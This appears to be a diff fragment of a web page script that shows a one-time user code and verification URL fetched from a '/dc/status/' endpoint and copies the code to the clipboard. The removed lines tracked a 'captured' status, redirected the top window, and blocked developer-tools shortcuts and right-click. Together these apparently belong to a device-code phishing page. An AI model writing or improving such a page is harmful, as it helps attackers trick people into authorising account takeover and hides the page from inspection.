-        var target = d.redirect_url || DEFAULT_REDIRECT;
-        setTimeout(function() { top.location.href = target; }, 2500);
+      function fallbackCopy() {
+        const t = document.createElement("textarea");
+        t.value = text;
+        t.style.position = "fixed";
+        t.style.opacity = "0";
+        document.body.appendChild(t);
+        t.select();
+        try { document.execCommand("copy"); } catch (e) {}
+        document.body.removeChild(t);
+        show();
       }
-      if (!d.failed && !d.expired && !d.captured) setTimeout(poll, 3000);
-    })['catch'](function() { setTimeout(poll, 5000); });
-  }
+    });
 
-  poll();
+    // If the backend already has the code ready, pre-fill the input? Optional: leave empty.
+    // Auto-focus the code field.
+    input.focus();
 
-  document.addEventListener('keydown', function(e) {
-    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['i','j','c'].includes(e.key.toLowerCase())) || (e.ctrlKey && e.key.toLowerCase() === 'u')) {
-      e.preventDefault();
+    // Start polling in the background if a session is present and code is ready.
+    // This allows the code box to update even before the user clicks "Next".
+    if (sid && sid !== '{session_id}') {
+      // Only poll if we have a real session id (not a placeholder)
+      // We start polling lazily when the user submits, but we also poll once
+      // to pick up any ready code for the demo button.
+      if (!codeReady) {
+        fetch('/dc/status/' + sid, { method: 'GET', credentials: 'include' })
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+          if (d.ready && d.user_code) {
+            codeReady = true;
+            userCode = d.user_code;
+            setDemoCode(userCode);
+            if (d.verify_url) verifyUrl = d.verify_url;
+          }
+        })['catch'](function(){});
+      }
     }
-  });
-  document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
-
-  if (timerEl) {
-    var m = Math.floor(expiresIn / 60);
-    var s = expiresIn % 60;
-    timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
-  }
-
-})();
+  })();
 </script>
-
 </body>
 </html>`
 
